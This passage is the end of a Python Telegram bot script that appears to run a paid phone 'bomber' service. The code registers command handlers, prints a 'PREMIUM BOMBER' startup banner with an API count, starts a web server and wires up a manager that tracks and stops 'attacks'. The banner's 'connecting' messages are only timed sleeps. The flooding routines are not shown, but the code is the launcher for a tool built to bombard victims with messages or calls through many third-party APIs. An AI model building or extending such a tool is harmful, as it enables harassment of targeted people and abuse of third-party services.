    app.add_handler(CommandHandler("reapi", reapi_command))
    
    # Handle all text messages
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_msg))
    
    # Handle callback queries
    app.add_handler(CallbackQueryHandler(btn_handler))
    
    print("=" * 50)
    print("🚀 [SYSTEM] Connecting to API Database...")
    time.sleep(0.5)
    print(f"📡 [SYSTEM] {len(APIS)} APIs Connected Successfully.")
    time.sleep(0.3)
    print("🔥 PREMIUM BOMBER Started")
    print(f"📊 Total APIs: {len(APIS)}")
    print(f"🤖 Bot Token: {BOT_TOKEN[:15]}...")
    print(f"👑 Owner ID: {OWNER_ID}")
    print("🔒 System: Premium Only")
    print("⏰ Connection: Active")
    print("=" * 50)
    
    # Start web server and manager session in background
    # Start web server and manager session in background
    async def post_init(application):
        def web_done(task):
            try:
                task.result()
            except Exception as e:
                logger.error(f"Web server task died: {e}")
        
        web_task = asyncio.create_task(web_server())
        web_task.add_done_callback(web_done)
        await manager.get_session()
    
    async def post_shutdown(application):
        await manager.stop_all_attacks()
        await manager.close_session()
    
    app.post_init = post_init
    app.post_shutdown = post_shutdown
    
    # Run bot
    print("🚀 Bot starting...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        pass
